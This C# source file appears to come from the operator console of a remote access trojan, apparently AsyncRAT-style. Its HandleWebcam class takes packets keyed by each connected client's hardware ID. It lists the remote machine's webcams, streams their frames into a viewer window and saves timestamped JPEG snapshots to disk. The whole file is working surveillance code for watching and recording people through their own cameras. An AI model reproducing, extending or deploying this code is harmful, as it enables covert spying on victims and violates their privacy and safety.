using Server.Forms;
using Server.Helper;
using Server.MessagePack;
using Server.Connection;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing.Imaging;

namespace Server.Handle_Packet
{
    class HandleWebcam
    {
        public HandleWebcam(MsgPack unpack_msgpack, Clients client)
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "getWebcams":
                    {
                        FormWebcam webcam = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                        try
                        {
                            if (webcam != null)
                            {
                                webcam.Client = client;
                                webcam.timer1.Start();
                                foreach (string camDriver in unpack_msgpack.ForcePathObject("List").AsString.Split(new[] { "-=>" }, StringSplitOptions.None))
                                {
                                    if (!string.IsNullOrWhiteSpace(camDriver))
                                        webcam.comboBox1.Items.Add(camDriver);
                                }
                                webcam.comboBox1.SelectedIndex = 0;
                                if (webcam.comboBox1.Text == "None")
                                {
                                    client.Disconnected();
                                    return;
                                }
                                webcam.comboBox1.Enabled = true;
                                webcam.button1.Enabled = true;
                                webcam.btnSave.Enabled = true;
                                webcam.numericUpDown1.Enabled = true;
                                webcam.labelWait.Visible = false;
                                webcam.button1.PerformClick();
                            }
                            else
                            {
                                client.Disconnected();
                            }
                        }
                        catch { }
                        break;
                    }

                case "capture":
                    {
                        FormWebcam webcam = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                        try
                        {
                            if (webcam != null)
                            {
                                using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                                {
                                    webcam.GetImage = (Image)Image.FromStream(memoryStream).Clone();
                                    webcam.pictureBox1.Image = webcam.GetImage;
                                    webcam.FPS++;
                                    if (webcam.sw.ElapsedMilliseconds >= 1000)
                                    {
                                        if (webcam.SaveIt)
                                        {
                                            if (!Directory.Exists(webcam.FullPath))
                                                Directory.CreateDirectory(webcam.FullPath);
                                            webcam.pictureBox1.Image.Save(webcam.FullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg", ImageFormat.Jpeg);
                                        }
                                        webcam.Text = "Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString + "    FPS:" + webcam.FPS + "    Screen:" + webcam.GetImage.Width + " x " + webcam.GetImage.Height + "    Size:" + Methods.BytesToString(memoryStream.Length);
                                        webcam.FPS = 0;
                                        webcam.sw = Stopwatch.StartNew();
                                    }
                                }
                            }
                            else
                            {
                                client.Disconnected();
                            }
                        }
                        catch { }
                        break;
                    }
            }
        }
    }
}
